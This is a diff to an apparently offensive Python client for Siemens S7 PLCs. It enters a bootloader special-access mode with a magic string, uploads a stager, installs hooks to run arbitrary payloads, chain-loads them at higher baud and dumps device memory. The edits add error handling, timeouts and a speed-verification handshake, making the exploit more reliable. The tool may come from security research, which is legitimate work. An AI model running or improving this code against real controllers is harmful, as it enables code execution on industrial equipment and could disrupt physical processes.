@@ -91,6 +91,9 @@ class SiemensS7Client:
         stop = False
         while not stop:
             next_chunk = self.recv_packet()
+            if next_chunk is None:
+                log.error("recv_packet returned None during recv_many")
+                return None
             if verbose and (len(answ) & 0xff) < 16:
                 log.info("Read {}".format(len(answ)))
             if next_chunk == "":
@@ -107,13 +110,16 @@ class SiemensS7Client:
         log.error("Could not encode chunk: {}".format(chunk.encode("hex")))
         assert False
 
-    def send_full_msg_via_stager(self, msg, chunk_size=8, sleep_amt=0.01):
+    def send_full_msg_via_stager(self, msg, chunk_size=2, sleep_amt=0.01):
         for i in range(0, len(msg), MAX_MSG_LEN - 1):
             time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
             chunk = msg[i:i + MAX_MSG_LEN - 1]
             log.info("Send progress: 0x{:06x}/0x{:06x} ({:3.2f})".format(i, len(msg), float(i) / float(len(msg))))
             self.send_packet(self.encode_packet_for_stager(chunk), chunk_size, sleep_amt)
             answ = self.recv_packet()
+            if answ is None:
+                log.error("recv_packet returned None during send_full_msg_via_stager")
+                return None
             if not len(answ) == 1:
                 log.error("expecting empty ack package, got '{}' instead".format(answ))
                 assert False
@@ -124,12 +130,16 @@ class SiemensS7Client:
         self.recv_packet()
 
     def get_version(self):
-        self.invoke_primary_handler(0, await_response=False) # The original code was bugged, it did not await response
+        # Keep target-branch fix: send then await response explicitly
+        self.invoke_primary_handler(0, await_response=False)
         return self.recv_packet()
 
     def bye(self):
         self.invoke_primary_handler(0xa2)
         answ = self.recv_packet()
+        if answ is None:
+            log.warning("recv_packet returned None during bye()")
+            return
         assert (answ == "\xa2\x00")
 
     def invoke_primary_handler(self, handler_ind, args="", await_response=True):
@@ -222,18 +232,70 @@ class SiemensS7Client:
         return self.recv_many(verbose=True)
 
     def switch_to_turbo_mode(self):
+        """
+        Perform turbo mode handshake and switch UART baud rate from 38400 to 115200.
+
+        Protocol:
+        1. Wait for 0xAA from device (handshake initiator)
+        2. Send 0x5F to device (confirmation)
+        3. Switch local baud rate to 115200
+        4. Verify speed change by exchanging 0xCC/0xDD with the device (see verify_turbo_speed())
+
+        Returns:
+            bool: True if handshake successful, False otherwise
+
+        Note:
+            After calling this method, you should call verify_turbo_speed() to complete the turbo mode protocol.
+        """
         log.info("Waiting for turbo handshake initiator (0xAA)...")
-        initator = self.r.recv(1)
-        if initator != '\xaa':
-            log.error("Did not receive turbo handshake initiator. Got {} instead.".format(hexlify(initator)))
+        initiator = self.r.recv(1, timeout=3)
+        if initiator == '':
+            log.error("Timeout waiting for turbo handshake initiator (0xAA).")
+            return False
+        if initiator != '\xaa':
+            log.error("Did not receive turbo handshake initiator. Got {} instead.".format(hexlify(initiator)))
             return False
         log.info("Got initiator. Sending confirmation (0x5F) and switching baud rate.")
         self.r.send('\x5f')
-        self.r.baudrate = 115200
+        # On pwntools serialtube, prefer set_baudrate if available, else assign
+        if hasattr(self.r, "set_baudrate"):
+            self.r.set_baudrate(115200)
+        else:
+            self.r.baudrate = 115200
         log.success("Switched to 115200 baud.")
         return True
 
+    def verify_turbo_speed(self):
+        log.info("Sending speed verification (0xCC)...")
+        self.r.send('\xcc')
+        log.info("Waiting for confirmation (0xDD)...")
+        confirmation = self.r.recv(1, timeout=3)
+        if confirmation == '':
+            log.error("Timeout waiting for speed confirmation (0xDD). Baud rate switch may have failed.")
+            return False
+        if confirmation != '\xdd':
+            log.error("Did not receive speed confirmation (0xDD). Got {} instead.".format(hexlify(confirmation)))
+            return False
+        log.success("Speed verification successful. Communication at 115200 baud confirmed.")
+        return True
+
     def load_payload_turbo(self, payload, dest_addr):
+        """
+        Load a payload at high speed (115200 baud) via the turbo stager.
+
+        The turbo stager receives the payload, installs it at the specified
+        address, and registers it as a hook handler.
+
+        Args:
+            payload (str): Binary payload data to load
+            dest_addr (int): Destination address in device memory where payload will be loaded
+
+        Returns:
+            bool: True if payload loaded and installed successfully, False otherwise
+        """
+        if payload is None or len(payload) == 0:
+            log.error("Invalid payload: cannot load empty or None payload via turbo mode.")
+            return False
         log.info("Sending destination address: 0x{:08x}".format(dest_addr))
         self.r.send(struct.pack('>I', dest_addr))
         log.info("Sending payload size: {} bytes".format(len(payload)))
@@ -241,15 +303,16 @@ class SiemensS7Client:
         log.info("Sending payload...")
         self.r.send(payload)
         log.info("Waiting for 'Done' signal from stager...")
-        done_signal = self.r.recv(1)
+        done_signal = self.r.recv(1, timeout=3)
         if done_signal != 'D':
-            log.error("Did not receive 'Done' signal. Got {}.".format(hexlify(done_signal)))
+            log.error("Did not receive 'Done' signal. Got {}.".format(hexlify(done_signal) if done_signal is not None else done_signal))
             return False
         log.success("Payload loaded and installed successfully via turbo stager.")
         return True
 
     def handle_connection(self, args):
-        log.success("[+] Got special access greeting: {} [{}]".format(self.r.recv(5).encode('hex'), self.r.recv(5).encode('hex')))
+        greeting = self.r.recv(5)
+        log.success("[+] Got special access greeting: {} [{}]".format(greeting, greeting.encode('hex')))
 
         version = self.get_version()
         bootloaderversion = version[2:3] + ".".join([str(ord(c)) for c in version[3:-2]])
@@ -262,6 +325,7 @@ class SiemensS7Client:
         log.info("Writing the initial stage took {} seconds".format(time.time() - start))
 
         payload = args.payload.read() if hasattr(args, 'payload') and args.payload else None
+        contents = None  # track memory dump results
 
         # If turbo mode is enabled, chain-load the turbo stager and then the final payload
         if args.turbo_stager:
@@ -275,13 +339,17 @@ class SiemensS7Client:
             # 2. Invoke turbo_stager (non-blocking) to start handshake
             self.invoke_add_hook(turbo_stager_hook, await_response=False)
 
-            # 3. Perform handshake and switch baud rate
-            if not self.switch_to_turbo_mode(): return
+            # 3. Perform handshake and switch baud rate, then verify speed
+            if not self.switch_to_turbo_mode():
+                return
+            if not self.verify_turbo_speed():
+                return
 
             # 4. Load the final payload (e.g., dump_mem) at high speed
-            if not self.load_payload_turbo(payload, self.next_payload_location): return
+            if not self.load_payload_turbo(payload, self.next_payload_location):
+                return
 
-            # The final payload is now installed at the *same* hook index as the turbo_stager was, because the turbo_stager overwrites its own hook entry.
+            # The final payload is now installed at the same hook index as the turbo_stager
             second_addhook_ind = turbo_stager_hook
 
         # If not turbo mode, just load the payload normally
@@ -290,10 +358,13 @@ class SiemensS7Client:
                 start = time.time()
                 second_addhook_ind = self.install_addhook_via_stager(self.next_payload_location, payload, stager_addhook_ind)
                 log.info("Installing the additional hook took {} seconds".format(time.time() - start))
+            else:
+                second_addhook_ind = None
 
         # --- Execute final action ---
         # This part is now common for both turbo and normal mode
-        if args.action == ACTION_INVOKE_HOOK:
+        if second_addhook_ind is not None:
+            if args.action == ACTION_INVOKE_HOOK:
                 answ = self.invoke_add_hook(second_addhook_ind, args.args)
                 log.info("Got answer: {}".format(answ))
             elif args.action == ACTION_DUMP:
@@ -304,7 +375,11 @@ class SiemensS7Client:
                 log.info("Got answer: {}".format(answ))
             elif args.action == ACTION_HELLO_LOOP:
                 self.invoke_add_hook(second_addhook_ind, await_response=False)
-                while True: log.info("Got packet: {}".format(self.recv_packet()))
+                while True:
+                    pkt = self.recv_packet()
+                    if pkt is None:
+                        break
+                    log.info("Got packet: {}".format(pkt))
             elif args.action == ACTION_TIC_TAC_TOE:
                 log.info("[*] Demonstrating Code Execution")
                 self.invoke_add_hook(second_addhook_ind, await_response=False)
@@ -312,16 +387,21 @@ class SiemensS7Client:
                 END_TOKEN = "==>"
                 while END_TOKEN not in msg:
                     msg = self.recv_packet()
+                    if msg is None:
+                        break
                     sys.stdout.write(msg)
                     sys.stdout.flush()
                     if "enter a number" in msg:
                         choice = raw_input()
                         self.send_packet(choice[0])
                 log.info("[*] Done here!")
+        else:
+            log.warning("No payload/hook installed; skipping action execution.")
 
-        if 'contents' in locals() and contents:
+        if contents:
             out_filename = args.outfile if hasattr(args, 'outfile') and args.outfile else "mem_dump_{:08x}_{:08x}".format(args.address, args.address + args.length)
-            with open(out_filename, "wb") as f: f.write(contents)
+            with open(out_filename, "wb") as f:
+                f.write(contents)
             log.success("Wrote {} bytes to {}".format(len(contents), out_filename))
 
         log.info("Saying bye...")
@@ -408,9 +488,9 @@ def main():
     log.info("Sending magic 'MFGT1' to enter protocol mode...")
     pad = 4 * "A"
     magic = "MFGT1"
-    for i in range(100):
+    for i in range(150):
         r.send(pad + magic)
-        answ = r.recv(256, timeout=0.3)
+        answ = r.recv(256, timeout=0.5)
         if len(answ) > 0:
             if not answ.startswith("\5-CPU"):
                 answ += r.recv(256)
@@ -418,6 +498,8 @@ def main():
                 r.unrecv(answ)
                 client.handle_connection(args)
                 break
+        if i % 10 == 9:
+            time.sleep(0.1)
     else:
         log.error("Failed to get response from PLC. Is it connected and in the right mode?")
 
